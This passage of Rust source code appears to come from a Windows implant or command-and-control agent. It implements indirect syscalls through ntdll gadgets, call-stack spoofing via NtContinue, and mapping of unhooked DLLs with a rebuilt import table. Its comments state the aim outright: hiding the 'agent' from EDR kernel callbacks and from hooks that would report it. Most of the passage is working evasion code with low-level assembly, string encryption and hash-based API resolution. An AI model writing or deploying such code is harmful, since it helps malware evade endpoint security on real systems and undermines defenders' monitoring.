        //   user-mode return address — agent code never appears in any
        //   kernel-visible frame.
        //
        // The NtContinue call itself is made via a bare `syscall` instruction
        // in inline asm (no further stack manipulation) so there is no
        // recursive spoof nesting.
        #[cfg(all(feature = "stack-spoof", target_arch = "x86_64"))]
        if spoof_frame != 0 {
            use winapi::um::winnt::{CONTEXT, CONTEXT_INTEGER, CONTEXT_CONTROL};

            let ntcontinue_ssn: u32 =
                *NTCONTINUE_SSN.get_or_init(|| resolve_ntcontinue_ssn());

            if ntcontinue_ssn != 0 {
                // ── Spoofed call stack layout for the target syscall ─────────
                //
                // When the kernel restores our CONTEXT and resumes at the
                // `syscall; ret` gadget, ctx.Rsp must satisfy:
                //
                //   [Rsp + 0x00]  return address  ← spoof_frame (ntdll ret gadget)
                //   [Rsp + 0x08]  shadow home rcx  ← continuation (popped by spoof_frame ret)
                //   [Rsp + 0x10]  shadow home rdx  (zeroed; never read by kernel for syscalls)
                //   [Rsp + 0x18]  shadow home r8   (zeroed; never read by kernel for syscalls)
                //   [Rsp + 0x20]  shadow home r9   (zeroed; never read by kernel for syscalls)
                //   [Rsp + 0x28]  arg 5            (if nstack >= 1)
                //   [Rsp + 0x30]  arg 6            ...
                //
                // Execution trace:
                //   NtContinue restores ctx → CPU executes `syscall` at gadget
                //   → kernel handles target syscall
                //   → gadget `ret` pops [Rsp+0x00] = spoof_frame  (rsp += 8)
                //   → spoof_frame `ret` pops [new_rsp] = continuation (rsp += 8)
                //   → resumes at label 2: with RAX = target syscall NTSTATUS
                //
                // Why shadow[0] (Rsp+0x08) can hold continuation:
                //   Shadow slots are pre-allocated by the *caller* for the
                //   callee to optionally spill register args.  The NT kernel's
                //   syscall dispatch path never reads them for dispatching.
                //   Re-using shadow[0] for the continuation avoids adding any
                //   extra slots and keeps the 5th-arg offset at [Rsp+0x28].
                //
                // Layout (Vec indices):
                //   [0]           = spoof_frame
                //   [1]           = continuation  (shadow[0] slot — filled from asm)
                //   [2..4]        = shadow[1..3]  (zeroed)
                //   [5..5+nstack] = stack args    (args[4..])
                let frame_elems = 5 + nstack;
                let mut spoof_frame_buf: Vec<u64> = vec![0u64; frame_elems];
                spoof_frame_buf[0] = spoof_frame as u64;
                // [1] = continuation — filled from asm below.
                // [2..4] remain zero (shadow[1..3]).
                for i in 0..nstack {
                    spoof_frame_buf[5 + i] = unsafe { *stack_ptr.add(i) };
                }
                let cont_slot_ptr: *mut u64 = &mut spoof_frame_buf[1];

                // Build the CONTEXT (zero-init).  CONTEXT_INTEGER | CONTEXT_CONTROL
                // is sufficient for NtContinue to restore all integer registers and
                // control-flow state without touching floating-point state.
                //
                // CONTEXT must be 16-byte aligned (Windows ABI requirement).
                // winapi's CONTEXT lacks #[repr(align(16))]; we over-allocate
                // by 15 bytes and align the pointer manually.
                let ctx_size = std::mem::size_of::<CONTEXT>();
                let mut ctx_storage: Vec<u8> = vec![0u8; ctx_size + 15];
                let ctx_ptr_raw = ctx_storage.as_mut_ptr() as usize;
                let ctx_ptr_aligned = (ctx_ptr_raw + 15) & !15usize;
                let ctx: &mut CONTEXT =
                    unsafe { &mut *(ctx_ptr_aligned as *mut CONTEXT) };

                ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
                ctx.Rax = ssn as u64;
                ctx.Rcx = a1;
                ctx.Rdx = a2;
                ctx.R8  = a3;
                ctx.R9  = a4;
                ctx.R10 = a1;  // NT syscall ABI: R10 = RCX at entry
                ctx.Rip = gadget_addr as u64;
                // Rsp → spoof_frame_buf[0]; gadget `ret` pops buf[0]=spoof_frame,
                // then spoof_frame `ret` pops buf[1]=continuation.
                ctx.Rsp = spoof_frame_buf.as_ptr() as u64;

                // ── Dispatch via a bare `syscall` for NtContinue ─────────────
                // No stack manipulation here.  The kernel restores our CONTEXT;
                // any trap frame it constructs before the target `syscall`
                // executes will show ctx.Rsp→spoof_frame (ntdll) as the
                // user-mode return site — agent code never appears.
                let nt_status: i32;
                unsafe {
                    asm!(
                        // Fill in the continuation address at spoof_frame_buf[1].
                        "lea r15, [rip + 2f]",
                        "mov [{cont_slot}], r15",
                        // NtContinue arguments (Windows x64 syscall ABI):
                        //   RCX / R10 = PCONTEXT
                        //   RDX       = TestAlert (FALSE = 0)
                        //   EAX       = SSN
                        "mov rcx, {ctx_ptr}",
                        "xor rdx, rdx",
                        "mov r10, rcx",
                        "mov eax, {ntc_ssn:e}",
                        // Direct syscall — no fake frames, no jmp.
                        "syscall",
                        // ── Continuation ──────────────────────────────────────
                        // Reached after: gadget ret → spoof_frame ret → here.
                        // RAX holds the NTSTATUS from the target syscall.
                        "2:",
                        ctx_ptr   = in(reg) ctx_ptr_aligned as u64,
                        cont_slot = in(reg) cont_slot_ptr as u64,
                        ntc_ssn   = in(reg) ntcontinue_ssn,
                        lateout("rax") nt_status,
                        out("rcx") _, out("rdx") _, out("r10") _, out("r11") _,
                        out("r15") _,
                    );
                }
                // Keep buffers live until here.
                let _ = &spoof_frame_buf;
                let _ = &ctx_storage;
                return nt_status;
            }
            // NtContinue SSN unavailable — fall through to jmp-based spoof below.
        }
        // ─────────────────────────────────────────────────────────────────────

        // SAFETY: Register allocation constraints are explicit to guarantee that
        // `nstack` and `stack_ptr` can never share a register with `a1` or `a2`.
        //
        // The rep movsq trio uses:
        //   rcx – count (decremented to zero by the instruction)
        //   rsi – source pointer (advanced past the last copied qword)
        //   rdi – destination pointer (also advanced)
        //
        // `nstack` is bound to rcx via `inout("rcx") nstack => _` and
        // `stack_ptr` is bound to rsi via `inout("rsi") stack_ptr => _`.
        // Because those two physical registers are already claimed as named
        // operands, LLVM cannot use them for any other `in(reg)` operand.
        // In particular, `a1` and `a2` are guaranteed to land on registers
        // outside {rcx, rsi, rdi, rax, rdx, r8, r9, r10, r11, r14} (all of
        // which are declared), leaving only {rbx, r12, r13, r15} as candidates
        // — none of which are read or written by this asm block.
        //
        // Consequently the rep movsq path is fully consumed and rcx/rsi/rdi
        // are all advanced/zeroed BEFORE `mov rcx, {a1}` reads the first
        // syscall argument.  There is no longer any dependency on template
        // string ordering for correctness: the constraint declarations alone
        // enforce the required sequencing.
        asm!(
            // Save RSP so we can restore it cleanly after the call.
            "mov r14, rsp",
            // Allocate shadow space (0x20) + stack args.  The 5th argument
            // must be at [rsp + 0x20] BEFORE the `call` instruction, because
            // `call` pushes the 8-byte return address, shifting rsp down by 8;
            // the callee then sees the 5th argument at [rsp + 0x28] (= our
            // pre-call [rsp + 0x20]).  Using 0x28 here would shift all stack
            // args by one slot — a calling-convention violation.
            //
            // rcx already holds nstack (explicit inout("rcx") constraint).
            "mov rax, rcx",
            "shl rax, 3",
            "add rax, 0x20 + 15",
            "and rax, -16",
            "sub rsp, rax",
            // Copy stack arguments (args[4..]) into [rsp + 0x20 .. rsp + 0x20 + nstack*8].
            // rcx = count (nstack), rsi = source (stack_ptr), rdi = destination.
            // All three are consumed by rep movsq; a1/a2 are in separate registers
            // and cannot be touched by this loop (see SAFETY comment above).
            "test rcx, rcx",
            "jz 4f",
            "lea rdi, [rsp + 0x20]",
            "cld",
            "rep movsq",
            "4:",
            // Load syscall arguments.  {a1} is in a compiler-chosen register
            // distinct from every named register above; it is safe to read here
            // now that the rep movsq trio (rcx/rsi/rdi) has been fully consumed.
            "mov rcx, {a1}",
            "mov rdx, {a2}",
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "mov r11, {gadget}",
            // ── Call-stack spoofing (feature = "stack-spoof") ─────────────────
            // When `spoof_frame` is non-zero (a valid `ret` inside ntdll was
            // found), build a two-entry fake frame chain before jumping to the
            // syscall gadget:
            //
            //   [rsp+0]:  spoof_frame  — `ret` inside ntdll!NtQuerySystemTime
            //   [rsp+8]:  label 43     — our real continuation in do_syscall
            //
            // Execution flow:
            //   jmp r11 → syscall_gadget (syscall; ret)
            //           → spoof_frame (0xC3 ret inside ntdll)
            //           → label 43 (real continuation)
            //
            // EDR kernel callbacks walking the user-mode stack during the
            // kernel transition see the chain:
            //   ntdll!NtQuerySystemTime+N  ← immediate return site (spoofed)
            //   do_syscall (label 43)       ← one further level
            //
            // This keeps the topmost visible frame entirely within ntdll,
            // eliminating the "call from unbacked memory" indicator.
            //
            // When `spoof_frame` == 0 (feature off or gadget unavailable),
            // `jz 44f` falls through to the plain `call r11` path so the
            // existing behaviour is preserved with negligible overhead.
            "test {spoof_frame}, {spoof_frame}",
            "jz 44f",
            // Spoofed path: push fake call chain, then jump to syscall gadget.
            "lea r15, [rip + 43f]",    // r15 = address of label 43 (real continuation)
            "push r15",                 // [rsp]   = real continuation  (popped by ntdll ret)
            "mov r15, {spoof_frame}",  // r15 = NtQuerySystemTime ret-gadget address
            "push r15",                 // [rsp]   = spoof_frame         (popped by gadget ret)
            "jmp r11",                  // → syscall_gadget; ret → spoof_frame; ret → 43:
            "43:",
            "jmp 45f",
            // Plain indirect syscall (default, or fallback when spoof_frame == 0):
            "44:",
            "call r11",
            // ─────────────────────────────────────────────────────────────────
            "45:",
            "mov rsp, r14",
            ssn         = in(reg) ssn,
            gadget      = in(reg) gadget_addr,
            spoof_frame = in(reg) spoof_frame,
            // nstack → rcx; stack_ptr → rsi.  Explicit inout constraints prevent
            // the compiler from co-allocating either with a1/a2/ssn/gadget.
            inout("rcx") nstack => _,
            inout("rsi") stack_ptr => _,
            a1 = in(reg) a1,
            a2 = in(reg) a2,
            // r8/r9 are both inputs (args 3 and 4) and caller-saved (the called
            // function may overwrite them).  Declare as inlateout so the compiler
            // knows the values are gone after the asm block.
            inlateout("r8")  a3 => _,
            inlateout("r9")  a4 => _,
            lateout("rax") status,
            out("rdx") _, out("r10") _, out("r11") _,
            out("r14") _, out("r15") _,
            out("rdi") _,
            // NOTE: nostack intentionally absent — this asm block modifies RSP.
        );

        status
    }
    #[cfg(target_arch = "aarch64")]
    {
        // Windows ARM64 syscall convention: x0-x7 hold the first 8 arguments,
        // x8 is the syscall number.  Stack arguments (beyond 8) are not handled
        // here; virtually all NT syscalls fit in 8 registers.
        let a1 = args.get(0).copied().unwrap_or(0);
        let a2 = args.get(1).copied().unwrap_or(0);
        let a3 = args.get(2).copied().unwrap_or(0);
        let a4 = args.get(3).copied().unwrap_or(0);
        let a5 = args.get(4).copied().unwrap_or(0);
        let a6 = args.get(5).copied().unwrap_or(0);
        let a7 = args.get(6).copied().unwrap_or(0);
        let a8 = args.get(7).copied().unwrap_or(0);
        let status: i32;
        std::arch::asm!(
            // Load syscall number into x8 (Windows/Linux ARM64 convention).
            // Cast ssn to u64 so that {ssn} expands to the 64-bit Xn form;
            // u32 defaults to the 32-bit Wn form, which makes `mov x8, wN`
            // an invalid ARM64 instruction.
            "mov x8, {ssn}",
            // Place all 8 register arguments.
            "mov x0, {a1}",
            "mov x1, {a2}",
            "mov x2, {a3}",
            "mov x3, {a4}",
            "mov x4, {a5}",
            "mov x5, {a6}",
            "mov x6, {a7}",
            "mov x7, {a8}",
            // Indirect call to the syscall gadget (e.g. `svc #0; ret` in ntdll).
            // `blr` writes the return address into x30 (LR); the gadget's
            // trailing `ret` uses x30 to return here.  We declare x30 as a
            // clobber so the compiler saves any live value before this block.
            "blr {gadget}",
            // Copy the 32-bit NTSTATUS from w0 to the compiler-chosen output
            // register.  Use the :w modifier so both sides are W-registers;
            // `mov Xd, Ws` is not a valid ARM64 encoding.
            "mov {status:w}, w0",
            ssn    = in(reg) ssn as u64,
            a1     = in(reg) a1,
            a2     = in(reg) a2,
            a3     = in(reg) a3,
            a4     = in(reg) a4,
            a5     = in(reg) a5,
            a6     = in(reg) a6,
            a7     = in(reg) a7,
            a8     = in(reg) a8,
            gadget = in(reg) gadget_addr as u64,
            status = out(reg) status,
            // Declare all caller-saved integer registers (Windows ARM64 ABI).
            // x0-x7 hold args and may be modified by the syscall stub or kernel;
            // x8 holds the syscall number; x9-x17 are volatile scratch registers;
            // x30 (LR) is overwritten by `blr`.
            out("x0")  _, out("x1")  _, out("x2")  _, out("x3")  _,
            out("x4")  _, out("x5")  _, out("x6")  _, out("x7")  _,
            out("x8")  _,
            out("x9")  _, out("x10") _, out("x11") _,
            out("x12") _, out("x13") _, out("x14") _, out("x15") _,
            out("x16") _, out("x17") _,
            out("x30") _,
            // Caller-saved NEON/FP registers (v0-v7, v16-v31 per ABI).
            out("v0")  _, out("v1")  _, out("v2")  _, out("v3")  _,
            out("v4")  _, out("v5")  _, out("v6")  _, out("v7")  _,
            out("v16") _, out("v17") _, out("v18") _, out("v19") _,
            out("v20") _, out("v21") _, out("v22") _, out("v23") _,
            out("v24") _, out("v25") _, out("v26") _, out("v27") _,
            out("v28") _, out("v29") _, out("v30") _, out("v31") _,
            // `blr` may use the stack freely; do not use options(nostack).
        );
        status
    }
}

#[cfg(windows)]
static CLEAN_MODULES: OnceLock<Mutex<HashMap<String, usize>>> = OnceLock::new();

#[cfg(windows)]
pub fn map_clean_dll(dll_name: &str) -> Result<usize> {
    let dll_lower = dll_name.to_lowercase();

    let cache_lock = CLEAN_MODULES.get_or_init(|| Mutex::new(HashMap::new()));
    if let Some(&base) = cache_lock.lock().unwrap().get(&dll_lower) {
        return Ok(base);
    }

    use winapi::um::winnt::{
        FILE_SHARE_READ, GENERIC_READ, PAGE_EXECUTE_READ, SECTION_MAP_EXECUTE, SECTION_MAP_READ,
        SEC_IMAGE,
    };

    unsafe {
        let ntdll_base = *CLEAN_NTDLL.get_or_init(|| {
            match map_clean_ntdll() {
                Ok(b) => b,
                Err(e) => {
                    log::warn!(
                        "map_clean_dll: could not map clean ntdll.dll: {e}; \
                         clean API resolution will fail for this session"
                    );
                    0
                }
            }
        });
        if ntdll_base == 0 {
            return Err(anyhow!("clean ntdll mapping unavailable; cannot map clean '{dll_name}'"));
        }

        let sys_ntcreatesection = get_syscall_id("NtCreateSection")?;
        let sys_ntmapview = get_syscall_id("NtMapViewOfSection")?;

        let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());

        let path_str = if dll_lower.contains(r"\") {
            dll_lower.clone()
        } else {
            format!(r"{}\System32\{}", sysroot, dll_name)
        };

        let sys_ntopenfile = get_syscall_id("NtOpenFile")?;

        use std::os::windows::ffi::OsStrExt;
        let mut nt_path = format!(r"\??\{}", path_str)
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect::<Vec<u16>>();

        let mut obj_name: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
        obj_name.Length = ((nt_path.len() - 1) * 2) as u16;
        obj_name.MaximumLength = (nt_path.len() * 2) as u16;
        obj_name.Buffer = nt_path.as_mut_ptr();

        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
        obj_attr.ObjectName = &mut obj_name;
        obj_attr.Attributes = 0x00000040; // OBJ_CASE_INSENSITIVE

        let mut io_status: [u64; 2] = [0, 0];
        let mut h_file: winapi::shared::ntdef::HANDLE = std::ptr::null_mut();

        let status = do_syscall(
            sys_ntopenfile.ssn,
            sys_ntopenfile.gadget_addr,
            &[
                &mut h_file as *mut _ as u64,
                0x80100000, // SYNCHRONIZE | FILE_READ_DATA (GENERIC_READ)
                &mut obj_attr as *mut _ as u64,
                &mut io_status as *mut _ as u64,
                1,    // FILE_SHARE_READ
                0x20, // FILE_SYNCHRONOUS_IO_NONALERT
            ],
        );

        if status != 0 {
            return Err(anyhow!(
                "Failed to open {} with NtOpenFile. Status: {:x}",
                dll_name,
                status
            ));
        }

        let mut h_section: winapi::shared::ntdef::HANDLE = std::ptr::null_mut();
        let status = do_syscall(
            sys_ntcreatesection.ssn,
            sys_ntcreatesection.gadget_addr,
            &[
                &mut h_section as *mut _ as u64,
                0x000f0000 | 0x0004 | 0x0008, // SECTION_MAP_READ | SECTION_MAP_EXECUTE | STANDARD_RIGHTS_REQUIRED
                std::ptr::null_mut::<u64>() as u64,
                std::ptr::null_mut::<u64>() as u64,
                0x20,      // PAGE_EXECUTE_READ
                0x1000000, // SEC_IMAGE
                h_file as u64,
            ],
        );
        pe_resolve::close_handle(h_file);

        if status != 0 || h_section.is_null() {
            return Err(anyhow!(
                "NtCreateSection failed with status {:x}. Refusing to initialize.",
                status
            ));
        }

        let mut base_addr: winapi::shared::ntdef::PVOID = std::ptr::null_mut();
        let mut view_size: winapi::shared::basetsd::SIZE_T = 0;

        let status = do_syscall(
            sys_ntmapview.ssn,
            sys_ntmapview.gadget_addr,
            &[
                h_section as u64,
                -1isize as u64, // CurrentProcess
                &mut base_addr as *mut _ as u64,
                0,
                0,
                std::ptr::null_mut::<u64>() as u64,
                &mut view_size as *mut _ as u64,
                1, // ViewShare
                0,
                0x20, // PAGE_EXECUTE_READ
            ],
        );
        pe_resolve::close_handle(h_section);

        if status != 0 || base_addr.is_null() {
            return Err(anyhow!(
                "NtMapViewOfSection failed with status {:x}. Refusing to initialize.",
                status
            ));
        }

        let base = base_addr as usize;
        cache_lock.lock().unwrap().insert(dll_lower.clone(), base);

        // Construct a fresh Import Address Table
        if let Err(e) = rebuild_iat(base) {
            tracing::warn!("Failed to rebuild IAT for clean {}: {}", dll_name, e);
        }

        Ok(base)
    }
}

#[cfg(windows)]
unsafe fn rebuild_iat(base: usize) -> Result<()> {
    let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
        anyhow::bail!("Invalid DOS signature");
    }

    let (nt_base, opt_magic) = pe_nt_base_and_magic(base)
        .ok_or_else(|| anyhow!("Invalid NT headers"))?;

    let import_dir_rva = match opt_magic {
        winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
            let nt_headers32 = nt_base as *const winapi::um::winnt::IMAGE_NT_HEADERS32;
            (*nt_headers32).OptionalHeader.DataDirectory
                [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_IMPORT as usize]
                .VirtualAddress
        }
        winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
            let nt_headers64 = nt_base as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
            (*nt_headers64).OptionalHeader.DataDirectory
                [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_IMPORT as usize]
                .VirtualAddress
        }
        _ => anyhow::bail!("Unsupported PE optional-header magic: 0x{:x}", opt_magic),
    };
    if import_dir_rva == 0 {
        return Ok(()); // No imports
    }

    let mut import_desc =
        (base + import_dir_rva as usize) as *const winapi::um::winnt::IMAGE_IMPORT_DESCRIPTOR;

    // M-26 Part D: resolve NtProtectVirtualMemory once for IAT protection changes.
    type NtProtectVirtualMemoryFn = unsafe extern "system" fn(
        *mut winapi::ctypes::c_void,
        *mut *mut winapi::ctypes::c_void,
        *mut winapi::shared::basetsd::SIZE_T,
        u32,
        *mut u32,
    ) -> i32;
    let nt_protect: Option<NtProtectVirtualMemoryFn> = {
        let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
            .unwrap_or(0);
        let nt_protect_hash = pe_resolve::hash_str(b"NtProtectVirtualMemory\0");
        if ntdll != 0 {
            pe_resolve::get_proc_address_by_hash(ntdll, nt_protect_hash)
                .map(|p| std::mem::transmute::<*const (), NtProtectVirtualMemoryFn>(p as *const ()))
        } else {
            None
        }
    };

    while (*import_desc).Name != 0 {
        let dll_name_ptr = (base + (*import_desc).Name as usize) as *const i8;
        let dll_name = std::ffi::CStr::from_ptr(dll_name_ptr)
            .to_str()
            .unwrap_or("");
        let dll_lower = dll_name.to_lowercase();

        // Critical DLLs we explicitly want clean copies of.
        // Check the cache first *without* recursing; if already mapped use it.
        // This prevents a deadlock if two threads race on the same DLL, or if
        // the dependency graph has a cycle (e.g., ntdll ↔ win32u forwarding).
        let is_critical = dll_lower
            == String::from_utf8_lossy(&string_crypt::enc_str!("ntdll.dll")).trim_end_matches('\0')
            || dll_lower
                == String::from_utf8_lossy(&string_crypt::enc_str!("kernelbase.dll"))
                    .trim_end_matches('\0')
            || dll_lower
                == String::from_utf8_lossy(&string_crypt::enc_str!("kernel32.dll"))
                    .trim_end_matches('\0');

        let dep_handle = if is_critical {
            // Fast-path: already in cache? Use it without recursing.
            let cached = CLEAN_MODULES
                .get()
                .and_then(|m| m.lock().unwrap().get(&dll_lower).copied());
            if let Some(b) = cached {
                b as *mut winapi::shared::minwindef::HINSTANCE__
            } else {
                match map_clean_dll(&dll_lower) {
                    Ok(b) => b as *mut winapi::shared::minwindef::HINSTANCE__,
                    Err(e) => {
                        // M-26: do NOT fall back to LoadLibraryA. Skip and warn.
                        // Unresolved IAT entries crashing on use is preferable to
                        // running hooked code that reports the agent to EDR.
                        tracing::warn!(
                            "rebuild_iat: clean mapping of {} failed ({}), skipping (refusing to fall back to hooked LoadLibraryA)",
                            dll_name, e
                        );
                        import_desc = import_desc.add(1);
                        continue;
                    }
                }
            }
        } else {
            match map_clean_dll(&dll_lower) {
                Ok(b) => b as *mut winapi::shared::minwindef::HINSTANCE__,
                Err(e) => {
                    tracing::warn!(
                        "rebuild_iat: clean mapping of {} failed ({}), skipping (refusing to fall back to hooked LoadLibraryA)",
                        dll_name, e
                    );
                    import_desc = import_desc.add(1);
                    continue;
                }
            }
        };

        if !dep_handle.is_null() {
            let original_thunk_rva = if *(*import_desc).u.OriginalFirstThunk() != 0 {
                *(*import_desc).u.OriginalFirstThunk()
            } else {
                (*import_desc).FirstThunk
            };

            if opt_magic == winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR32_MAGIC {
                let mut original_thunk = (base + original_thunk_rva as usize)
                    as *const winapi::um::winnt::IMAGE_THUNK_DATA32;
                let mut first_thunk = (base + (*import_desc).FirstThunk as usize)
                    as *mut winapi::um::winnt::IMAGE_THUNK_DATA32;

                // Make IAT writable
                let mut num_thunks = 0;
                let mut temp_thunk = first_thunk;
                while *(*temp_thunk).u1.AddressOfData() != 0 {
                    num_thunks += 1;
                    temp_thunk = temp_thunk.add(1);
                }
                let iat_size =
                    (num_thunks + 1) * std::mem::size_of::<winapi::um::winnt::IMAGE_THUNK_DATA32>();

                let mut old_protect = 0u32;
                {
                    let mut base_ptr = first_thunk as *mut winapi::ctypes::c_void;
                    let mut region_size = iat_size as winapi::shared::basetsd::SIZE_T;
                    if let Some(nt_p) = nt_protect {
                        nt_p(
                            -1isize as *mut winapi::ctypes::c_void,
                            &mut base_ptr,
                            &mut region_size,
                            winapi::um::winnt::PAGE_READWRITE,
                            &mut old_protect,
                        );
                    } else {
                        winapi::um::memoryapi::VirtualProtect(
                            first_thunk as *mut _,
                            iat_size,
                            winapi::um::winnt::PAGE_READWRITE,
                            &mut old_protect,
                        );
                    }
                }

                while *(*original_thunk).u1.AddressOfData() != 0 {
                    let addr_of_data = *(*original_thunk).u1.AddressOfData();
                    let proc_addr = if (addr_of_data & winapi::um::winnt::IMAGE_ORDINAL_FLAG32) != 0 {
                        let ordinal = (addr_of_data & 0xffff) as u16;
                        let addr = get_export_addr_by_ordinal(dep_handle as usize, ordinal as u32);
                        if !addr.is_null() {
                            addr as usize
                        } else {
                            tracing::warn!(
                                "rebuild_iat: ordinal {} in {} could not be resolved cleanly, leaving IAT slot unfilled",
                                ordinal, dll_name
                            );
                            0
                        }
                    } else {
                        let import_by_name = (base + addr_of_data as usize)
                            as *const winapi::um::winnt::IMAGE_IMPORT_BY_NAME;
                        let name_ptr = (*import_by_name).Name.as_ptr();
                        get_export_addr(dep_handle as usize, name_ptr)
                    };

                    if proc_addr != 0 {
                        if let Ok(proc_addr32) = u32::try_from(proc_addr) {
                            let mut_u1 = &mut (*first_thunk).u1 as *mut _ as *mut u32;
                            *mut_u1 = proc_addr32;
                        } else {
                            tracing::warn!(
                                "rebuild_iat: resolved address {:#x} for {} exceeds 32-bit range; leaving slot unfilled",
                                proc_addr,
                                dll_name
                            );
                        }
                    }

                    original_thunk = original_thunk.add(1);
                    first_thunk = first_thunk.add(1);
                }

                {
                    let restore_addr = first_thunk.sub(num_thunks) as *mut winapi::ctypes::c_void;
                    let mut base_ptr = restore_addr;
                    let mut region_size = iat_size as winapi::shared::basetsd::SIZE_T;
                    let mut prev_protect = 0u32;
                    if let Some(nt_p) = nt_protect {
                        nt_p(
                            -1isize as *mut winapi::ctypes::c_void,
                            &mut base_ptr,
                            &mut region_size,
                            old_protect,
                            &mut prev_protect,
                        );
                    } else {
                        winapi::um::memoryapi::VirtualProtect(
                            restore_addr as *mut _,
                            iat_size,
                            old_protect,
                            &mut prev_protect,
                        );
                    }
                }
            } else {
                let mut original_thunk = (base + original_thunk_rva as usize)
                    as *const winapi::um::winnt::IMAGE_THUNK_DATA64;
                let mut first_thunk = (base + (*import_desc).FirstThunk as usize)
                    as *mut winapi::um::winnt::IMAGE_THUNK_DATA64;

                // Make IAT writable
                let mut num_thunks = 0;
                let mut temp_thunk = first_thunk;
                while *(*temp_thunk).u1.AddressOfData() != 0 {
                    num_thunks += 1;
                    temp_thunk = temp_thunk.add(1);
                }
                let iat_size =
                    (num_thunks + 1) * std::mem::size_of::<winapi::um::winnt::IMAGE_THUNK_DATA64>();

                let mut old_protect = 0u32;
                {
                    let mut base_ptr = first_thunk as *mut winapi::ctypes::c_void;
                    let mut region_size = iat_size as winapi::shared::basetsd::SIZE_T;
                    if let Some(nt_p) = nt_protect {
                        nt_p(
                            -1isize as *mut winapi::ctypes::c_void,
                            &mut base_ptr,
                            &mut region_size,
                            winapi::um::winnt::PAGE_READWRITE,
                            &mut old_protect,
                        );
                    } else {
                        winapi::um::memoryapi::VirtualProtect(
                            first_thunk as *mut _,
                            iat_size,
                            winapi::um::winnt::PAGE_READWRITE,
                            &mut old_protect,
                        );
                    }
                }

                while *(*original_thunk).u1.AddressOfData() != 0 {
                    let addr_of_data = *(*original_thunk).u1.AddressOfData() as u64;
                    let proc_addr = if (addr_of_data & winapi::um::winnt::IMAGE_ORDINAL_FLAG64) != 0 {
                        let ordinal = (addr_of_data & 0xffff) as u16;
                        // Resolve via clean export table instead of hookable GetProcAddress (M-24/M-26).
                        let addr = get_export_addr_by_ordinal(dep_handle as usize, ordinal as u32);
                        if !addr.is_null() {
                            addr as usize
                        } else {
                            // M-26: do NOT fall back to GetProcAddress. Leave the slot at 0.
                            tracing::warn!(
                                "rebuild_iat: ordinal {} in {} could not be resolved cleanly, leaving IAT slot unfilled",
                                ordinal, dll_name
                            );
                            0
                        }
                    } else {
                        let import_by_name = (base + addr_of_data as usize)
                            as *const winapi::um::winnt::IMAGE_IMPORT_BY_NAME;
                        let name_ptr = (*import_by_name).Name.as_ptr();
                        get_export_addr(dep_handle as usize, name_ptr)
                    };

                    if proc_addr != 0 {
                        let mut_u1 = &mut (*first_thunk).u1 as *mut _ as *mut u64;
                        *mut_u1 = proc_addr as u64;
                    }

                    original_thunk = original_thunk.add(1);
                    first_thunk = first_thunk.add(1);
                }

                {
                    let restore_addr = first_thunk.sub(num_thunks) as *mut winapi::ctypes::c_void;
                    let mut base_ptr = restore_addr;
                    let mut region_size = iat_size as winapi::shared::basetsd::SIZE_T;
                    let mut prev_protect = 0u32;
                    if let Some(nt_p) = nt_protect {
                        nt_p(
                            -1isize as *mut winapi::ctypes::c_void,
                            &mut base_ptr,
                            &mut region_size,
                            old_protect,
                            &mut prev_protect,
                        );
                    } else {
                        winapi::um::memoryapi::VirtualProtect(
                            restore_addr as *mut _,
                            iat_size,
                            old_protect,
                            &mut prev_protect,
                        );
                    }
                }
            }
        }

        import_desc = import_desc.add(1);
    }

    Ok(())
}

#[cfg(windows)]
unsafe fn get_export_addr(base: usize, func_name_ptr: *const i8) -> usize {
    if func_name_ptr.is_null() {
        return 0;
    }

    let target_name = std::ffi::CStr::from_ptr(func_name_ptr).to_bytes_with_nul();
    let target_hash = pe_resolve::hash_str(target_name);
    pe_resolve::get_proc_address_by_hash(base, target_hash).unwrap_or(0)
}

#[cfg(windows)]
unsafe fn pe_nt_base_and_magic(base: usize) -> Option<(usize, u16)> {
    let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
        return None;
    }

    let nt_base = base + (*dos_header).e_lfanew as usize;
    if *(nt_base as *const u32) != winapi::um::winnt::IMAGE_NT_SIGNATURE {
        return None;
    }

    let opt_magic = *((nt_base
        + 4
        + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()) as *const u16);
    Some((nt_base, opt_magic))
}

#[cfg(windows)]
unsafe fn get_export_dir_any_bitness(
    base: usize,
) -> Option<(u32, u32, *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY)> {
    let (nt_base, opt_magic) = pe_nt_base_and_magic(base)?;

    let export_data_dir = match opt_magic {
        winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
            let nt_headers32 = nt_base as *const winapi::um::winnt::IMAGE_NT_HEADERS32;
            (*nt_headers32).OptionalHeader.DataDirectory
                [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
        }
        winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
            let nt_headers64 = nt_base as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
            (*nt_headers64).OptionalHeader.DataDirectory
                [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
        }
        _ => return None,
    };

    if export_data_dir.VirtualAddress == 0 {
        return None;
    }

    let ed = (base + export_data_dir.VirtualAddress as usize)
        as *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY;
    Some((
        export_data_dir.VirtualAddress,
        export_data_dir.Size,
        ed,
    ))
}

#[cfg(windows)]
